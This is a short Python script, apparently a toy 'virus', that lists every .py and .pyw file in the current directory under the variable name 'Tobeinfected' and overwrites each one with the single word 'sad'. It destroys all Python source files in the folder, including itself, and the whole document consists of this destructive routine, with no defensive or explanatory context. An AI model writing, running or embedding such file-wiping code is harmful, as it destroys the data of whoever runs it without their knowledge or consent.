import sys, glob 

Tobeinfected = glob.glob("*.py") + glob.glob("*.pyw")
replacement = ["sad"]


print(Tobeinfected)

for scripts in Tobeinfected:
    with open(scripts, 'w') as f:
        f.writelines(replacement)

